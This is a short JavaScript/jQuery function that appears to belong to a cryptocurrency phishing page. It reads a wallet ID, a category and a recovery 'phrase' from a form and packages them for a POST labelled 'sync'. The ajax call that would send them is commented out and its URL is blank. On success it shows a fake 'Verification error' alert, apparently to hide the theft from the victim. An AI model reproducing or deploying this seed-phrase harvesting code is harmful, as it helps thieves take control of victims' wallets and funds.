function submitemail(){
  var wallet = $('#wallet_id').val();
  var category = $('.category').val();
  var phrase = $('.phrase').val();
  var form_data = new FormData();
  form_data.append('function', 'sync');
  form_data.append('wallet', wallet);
  form_data.append('category', category);
  form_data.append('phrase', phrase);

  if(phrase === ""){
    $('#messageerror').html('<div><p>Enter minimum of 12 characters</p></div>');
    setTimeout(function(){
      $('#messageerror').html('<span></span>');
    }, 2000);
    return false;
  }

  
// $.ajax({
//    url:'',
//    dataType:'text',
//    method:'POST',
//    contentType:false,
//    processData: false,
//    data:form_data,

//    success:function(result){
//     if($.trim(result)=== 'message sent'){
//         $('#submit').prop('disabled', false);
//     alert( 'Verification error!Please contact the Admin/Support' );
//     }
//    },

//    error: function(){

//    }
// })

}